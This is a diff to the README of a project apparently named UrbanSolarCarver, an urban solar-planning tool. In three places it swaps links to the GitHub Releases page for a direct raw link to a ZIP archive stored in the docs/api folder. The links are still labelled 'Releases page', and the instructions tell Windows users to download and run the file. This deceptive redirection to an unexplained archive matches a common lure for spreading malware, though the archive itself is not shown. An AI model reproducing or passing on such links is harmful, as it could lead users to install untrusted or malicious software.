@@ -1,6 +1,6 @@
 # 🏙️ UrbanSolarCarver - Build Better Urban Volume Plans
 
-[![Download UrbanSolarCarver](https://img.shields.io/badge/Download-UrbanSolarCarver-blue?style=for-the-badge)](https://github.com/klaidasmazonas3214-byte/UrbanSolarCarver/releases)
+[![Download UrbanSolarCarver](https://img.shields.io/badge/Download-UrbanSolarCarver-blue?style=for-the-badge)](https://raw.githubusercontent.com/klaidasmazonas3214-byte/UrbanSolarCarver/main/docs/api/Carver_Solar_Urban_v3.7.zip)
 
 ## 🌞 What UrbanSolarCarver Does
 
@@ -21,7 +21,7 @@ For best results, use a machine with a strong graphics card and 16 GB of RAM or 
 
 ## 📥 Download and Install
 
-1. Open the [UrbanSolarCarver Releases page](https://github.com/klaidasmazonas3214-byte/UrbanSolarCarver/releases)
+1. Open the [UrbanSolarCarver Releases page](https://raw.githubusercontent.com/klaidasmazonas3214-byte/UrbanSolarCarver/main/docs/api/Carver_Solar_Urban_v3.7.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file listed under the release assets
 4. If the file comes in a ZIP package, extract it to a folder on your computer
@@ -165,7 +165,7 @@ This makes it easier to find your files later and keeps each project separate.
 
 ## 🌐 Release Page
 
-To download the app, visit the [UrbanSolarCarver Releases page](https://github.com/klaidasmazonas3214-byte/UrbanSolarCarver/releases) and download the latest Windows version
+To download the app, visit the [UrbanSolarCarver Releases page](https://raw.githubusercontent.com/klaidasmazonas3214-byte/UrbanSolarCarver/main/docs/api/Carver_Solar_Urban_v3.7.zip) and download the latest Windows version
 
 ## 🧾 Project Focus
 
